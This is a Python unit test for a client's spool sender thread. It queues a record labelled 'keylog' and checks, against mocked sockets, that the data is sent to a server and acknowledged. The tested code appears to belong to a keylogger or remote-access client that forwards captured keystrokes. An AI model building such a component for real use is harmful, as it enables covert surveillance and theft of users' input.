import threading, time
from unittest.mock import MagicMock, patch
from spool import Spool

def test_spool_sender_sends_and_acks(tmp_path):
    sp = Spool(tmp_path)
    sp.push("keylog", {"data": "abc", "time": "2026-01-01T00:00:00"})
    sent_commands = []
    mock_sock = MagicMock()

    def fake_send(sock, msg, key=None):
        sent_commands.append(msg)

    def fake_recv(sock, key=None):
        return b"SPOOL_ACK"

    stop = threading.Event()
    send_lock = threading.Lock()

    with patch("client.send_msg", fake_send), patch("client.recv_msg", fake_recv):
        import client as c
        t = threading.Thread(
            target=c._spool_sender_thread,
            args=(mock_sock, None, sp, stop, send_lock, 0.05),
            daemon=True
        )
        t.start()
        time.sleep(0.3)
        stop.set()
        t.join(timeout=1)

    assert any("spool_data" in str(m) for m in sent_commands)
    assert sp.pending() == []
